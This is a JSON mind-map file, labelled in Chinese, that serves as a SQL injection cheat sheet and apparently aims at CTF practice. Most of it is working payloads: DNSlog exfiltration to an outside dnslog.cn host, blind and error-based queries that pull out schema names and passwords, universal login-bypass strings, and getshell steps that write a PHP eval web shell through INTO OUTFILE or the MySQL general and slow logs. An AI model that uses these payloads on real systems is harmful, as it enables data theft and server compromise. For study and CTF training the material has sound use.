{"nodeData":{"id":"594fcba6e7996a0f","topic":"SQL","root":true,"children":[{"topic":"无回显","id":"594ff5ca2be0c40e","direction":0,"children":[{"topic":"DNS注入","id":"595171a320f62b48","children":[{"topic":"select load_file(concat(‘//‘,(select table_name from information_schema.tables where table_schema=database() limit 0,1),’.h3uk2s.dnslog.cn/abc’","id":"5c67b2d9563627d0"},{"topic":"注意：load_file函数再Linux下是无法用来做DNSLOG攻击的，因为这里就涉及到Windows的UNC路径。UNC是一种命名惯例, 主要用于在Microsoft Windows上指定和映射网络驱动器. UNC命名惯例最多被应用于在局域网中访问文件服务器或者打印机。我们日常常用的网络共享文件就是这个方式。其实我们平常在Windows中用共享文件的时候就会用到这种网络地址的形式\\\\sss.xxx\\test\\","id":"8e09f1cf85d060e6"}]},{"topic":"盲注","id":"5986e0d8f556e10e","children":[{"topic":"时间盲注","id":"595016fa13c369ab","children":[{"topic":"1' and if(1=1,sleep(5),1)--+","id":"5986961354e27a9f","children":[{"topic":"判断闭合方式","id":"59869b9c5a363469"}]},{"topic":"1' and if(length(database())=8,sleep(5),1)--+","id":"59869b3c8a163956","children":[{"topic":"判断长度","id":"5986a02df51aca2a"}]},{"topic":"1' and if(ascii(substr(database(),1,1))=115,sleep(5),1)--+","id":"5986a92e9a91b8dd","children":[{"topic":"爆库名","id":"5986a42881791e7c"}]},{"topic":"1' and if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),1,1))=101,sleep(5),1)--+","id":"5986c0fc378a6b4c","children":[{"topic":"爆表名","id":"5986c3fdc1ae25cb"}]},{"topic":"1' and if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='users'),1,1))=105,sleep(5),1)--+","id":"5986c71a6e8ec1d1","children":[{"topic":"爆字段","id":"5986cc5e8ea827c3"}]},{"topic":"1' and if(ascii(substr((select group_concat(password) from users),1,1))=68,sleep(5),1)--+","id":"5986ced2e9dd0253","children":[{"topic":"爆dump","id":"5986d9b68b8cc079"}]}]},{"topic":"bool盲注","id":"5950173b014272a3","children":[{"topic":"length()","id":"5c37945c61861d63","children":[{"topic":"1' and length(database())=8 %23","id":"5c37cf96cc01223b"}]},{"topic":"ascii(),substr()","id":"5c3797e37e888b4f","children":[{"topic":"1' and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))=101 %23","id":"5c37d2a74ae14d72"}]},{"topic":"mid(),ord()","id":"5c37b252e034f90c","children":[{"topic":"1' AND ORD(MID((SELECT username FROM users LIMIT 0,1),1,1))=68--+","id":"5c37d3844c5bd9b5"}]},{"topic":"left(),right()","id":"5c3793f9f2a4ba53","children":[{"topic":"1' and left(version,1)=5 %23","id":"5c37ca5f7fcfed23"}]}]}],"style":{"color":"#2c3e50","background":"#e74c3c"}}]},{"topic":"有回显","id":"594ff6046f31e906","direction":1,"children":[{"topic":"报错注入","id":"595000c478560cb9","children":[{"topic":"1' and extractvalue(1,concat(0x7e,(select schema_name from information_schema.schemata limit 0,1),0x7e)) --+","id":"595083dd98ab566f"},{"topic":"1' and updatexml(1,concat(0x7e,(select @@version),0x7e),1) --+","id":"5950843f522befbc"},{"topic":"1' union Select 1,count(*),concat(0x3a,0x3a,(select user()),0 x3a,0x3a,floor(rand(0)*2))a from information_schema.columns group by a--+","id":"5c380d23ca741f73"},{"topic":"double 数值类型超出范围进行报错注入","id":"5c380d7dd1174a29","children":[{"topic":"1' union select (exp(~(select * FROM(SELECT USER())a))),2, 3--+","id":"5c38255db7f1a3f9"}]},{"topic":"利用 bigint 溢出进行报错注入","id":"5c382758c418ca05","children":[{"topic":"1' union select (!(select * from (select user())x) - ~0),2,3- -+","id":"5c3828cd80a1eca6"}]}],"style":{"background":"#e74c3c"}},{"topic":"堆叠注入","id":"59500108752926e4","children":[{"topic":"在Mysql中，需要使用mysql_multi_query()函数才可以进行多条sql语句同时执行","id":"59868c720592e152"}],"style":{"background":"#e74c3c"}},{"topic":"搜索注入","id":"5950025ca3651fdc","children":[{"topic":"%闭合","id":"598599b559aaea66"}],"style":{"background":"#ecf0f1"}},{"topic":"删除注入","id":"59d872d8f67cc569","children":[{"topic":"配合二次注入","id":"595026bab4f7cd2c"}]},{"topic":"宽字节注入","id":"595027be6d58c97b","children":[{"topic":"%df","id":"5986416b8b21a130"},{"topic":"GBK-8","id":"5986442511b4eb72"},{"topic":"%E9%8C%A6","id":"89cc0c43e7e9068a"}]},{"topic":"UA,cookie等其他注入","id":"595039682bc23788"},{"topic":"判断注入类型(字符型 or 数字型)","id":"5950576404b32f70","children":[{"topic":"可以用and 1=1和and 1=2作为判断如果是字符型：and 1=1 和 and 1=2都会正常显示如果是数字型：and 1=1 会正常显示，但是 and 1=2不会正常显示","id":"59866d275749eefb","children":[{"topic":"字符注入","id":"59503344170c2185"},{"topic":"数字注入","id":"5950330aa8b06263"}]}],"style":{"background":"#e74c3c"}},{"topic":"直接读写文件","id":"5985569a2159ee42","children":[{"topic":"前提","id":"5985b452673de40a","children":[{"topic":"知道文件绝对路径 (data目录可以使用相对路径)","id":"5985b5f145db3236"},{"topic":"能够使用union查询","id":"5985b62d60af9884"},{"topic":"对想要读取的目录有读写权限,判断mysql是不是root","id":"5985b667eaf7f9df"}]},{"topic":"写木马","id":"5985c112d0bf7415","children":[{"topic":"union select 1,\"<?php @eval($_POST[1]);?>\" into outfile \"/var/www/html/test2.php\"","id":"598702621b9dc32b"}]},{"topic":"读文件","id":"5986ff83db7c6c8b","children":[{"topic":"load_file(\"/var/www/html/flag.php\")","id":"598559023bc0864d"}]}],"style":{"color":"#2c3e50","background":"#e74c3c"}}]},{"topic":"基本注入流程","id":"5950a319e9b39826","children":[{"topic":"判断闭合字符","id":"59867e5ffeadf3f7","children":[{"topic":"'","id":"5997905523224830"},{"topic":"')","id":"59979165b3b14737","children":[{"topic":"MySQL server version for the right syntax to use near ””) LIMIT 0,1′ at line 1","id":"5997a1243ca2e938","children":[{"topic":"$sql=\"SELECT * FROM users WHERE id=('$id') LIMIT 0,1\";","id":"5997dc1eb1cb674e"}]}]},{"topic":"1\")","id":"5997ac09ea2b84aa","children":[{"topic":"You have an error in your SQL syntax; check the manual that corresponds to your MySQ L server version for the right syntax to use near '\"1\"\") LIMIT 0,1' at line 1","id":"5997b3aacf333c13","children":[{"topic":"$sql=\"SELECT * FROM users WHERE id=(“$id”) LIMIT 0,1\";","id":"5997d9a0c9e307f9"}]}]},{"topic":"%","id":"59d9dc705762ff15"}]},{"topic":"万能密码有很多种形式：\n' or 1=1 --+ ## 字符型\n' or '1'='1 ## 字符型\n or 1=1 ## 数字型","id":"59867c13d2000909"},{"topic":"判断列数","id":"595138d91398792f","children":[{"topic":"order  by 4","id":"59515477272049d9"}]},{"topic":"判断回显位","id":"5951024c9c1bc82b","children":[{"topic":"-1 union select 1,2,3","id":"595109dd8877d54f"}]},{"topic":"数据库信息","id":"5950cf2ef56e285d","children":[{"topic":"database()","id":"5950dc1c1c2540a1"},{"topic":"user()","id":"595178530946bf3d"},{"topic":"version()","id":"595179e29b34db05"},{"topic":"@@datadir","id":"6471e5785341e2ae"}],"expanded":true},{"topic":"爆库","id":"5950de311460225a","children":[{"topic":"union select group_concat(schema_name) from information_schema.schemata","id":"5950eba0ca1cf6a8"}],"expanded":true},{"topic":"报表","id":"5950e31f1ae32c25","children":[{"topic":"union select group_concat(table_name) from information_schema.tables where table_schema=库名","id":"59519e4ebfdbf37b"}]},{"topic":"暴列","id":"5950e39308d56f4c","children":[{"topic":"union select group_concat(column_name) from information_schema.columns where table_name=表名","id":"5951aa9d685adf39"}]},{"topic":"dump","id":"5950e44a36e4cf29","children":[{"topic":"union  select 列 from 表","id":"5985ec04b3f3e073"}]}],"direction":0,"style":{"color":"#2c3e50","background":"#e74c3c"}},{"topic":"其他","id":"598728276dad241a","children":[{"topic":"show查询","id":"598731da16a5c332","children":[{"topic":"show databases;","id":"59872c0fe7abc463","children":[]},{"topic":"use {ctf}库名; show tables;","id":"59873154824b1c44"},{"topic":"desc emails;(查看表结构)","id":"5997172cab6ab006"},{"topic":"show columns from (表名)","id":"59874c0a0f418d88"}],"style":{"background":"#e74c3c"}},{"topic":"hander 查询(一次读取一行)","id":"59872c8b07e4f4bb","children":[{"topic":"handler 表名 open (as p);","id":"59876797045cfebb","children":[{"topic":"打开一个指定表名的句柄","id":"5987a969e92b0a9e"}]},{"topic":"handler 表名(p) read first","id":"598779de2d8c8802","children":[{"topic":"获取第一行","id":"5987ab5eb5a3c5cf","children":[]}]},{"topic":"handler 表名(p) read next","id":"59877987e8db8f47","children":[{"topic":"获取下一行","id":"5987abdc69b2048a"}]},{"topic":"handler 表名(p) read prev","id":"59878a5c039fa8e7","children":[{"topic":"获取上一行","id":"5987adf92d274962"}]},{"topic":"handler 表名(p) read last","id":"5987899d7eec0dfb","children":[{"topic":"获取最后一行","id":"5987af56651fcd43"}]},{"topic":"handler 表名(p) close","id":"598789112eb425f7"}],"style":{"color":"#2c3e50","background":"#e74c3c"}},{"topic":"预处理查询(可以用来绕过)","id":"59879748896a46a8","children":[{"topic":"set @b=concat(\"sele\",\"ct\",\"* from `1919810931114514`\");\nprepare dump from @b;\nexecute dump;","id":"59879c87bd3153ef"}],"style":{"background":"#e74c3c"}}],"direction":1},{"topic":"若查询长度不够尝试right(列,25)或left","id":"59dd93afe61592ce","children":[{"topic":"一般报错注入时尝试","id":"677b0424afa7097f"}],"direction":0},{"topic":"getshell","id":"8595766162443154","children":[{"topic":"into outfile写shell","id":"859577c0517b22db","children":[{"topic":"?id=1 INTO OUTFILE '物理路径' lines terminated by （一句话hex编码）#","id":"85977ef96432663b"},{"topic":"?id=1 INTO OUTFILE '物理路径' fields terminated by （一句话hex编码）#","id":"859781c354dfd022"},{"topic":"?id=1 INTO OUTFILE '物理路径' columns terminated by （一句话hex编码）#","id":"859781f669eea1b2"},{"topic":"?id=1 INTO OUTFILE '物理路径' lines starting by （一句话hex编码）#","id":"8597821b56971057"}]},{"topic":"日志文件","id":"85957828f834fc76","children":[{"topic":"show variables like '%general%'; #查看配置","id":"85978ef3e036cade"},{"topic":"set global general_log = on; #开启general log模式","id":"85979024fc570115"},{"topic":"set global general_log_file = 'E:/study/WWW/evil.php'; #设置日志目录为shell地址","id":"85979050544babb0"},{"topic":"select '<?php eval($_GET[g]);?>' #写入shell","id":"859790757bfae3e7"},{"topic":"set global general_log=off; #关闭general log模式","id":"859790d06dfa6384"}]},{"topic":"慢日志文件","id":"8595785561961af1","children":[{"topic":"show variables like '%slow%';","id":"85a82d76db472e51"},{"topic":"set GLOBAL slow_query_log_file='C:/phpStudy/PHPTutorial/WWW/slow.php';","id":"85a82e0c4d8688cf"},{"topic":"set GLOBAL slow_query_log=on;","id":"85a8301dda88a7b8"},{"topic":"set GLOBAL log_queries_not_using_indexes=on;","id":"85a830482557b144"}]}],"direction":1},{"topic":"注入位置","id":"87a5e88744bb0507","direction":0,"children":[{"topic":"header","id":"87a5eb1c77db2b6f","children":[{"topic":"cookie","id":"87a5eccb8fdf7919"},{"topic":"UA","id":"87a5ee0b12925515"}]},{"topic":"body","id":"87a5eedc1441ab32","children":[{"topic":"json","id":"87a5f08d747ed925","children":[{"topic":"符号需转义\\,或用其他编码格式","id":"87a5f1b7935af6a6"}]}]}]}]},"linkData":{},"direction":2}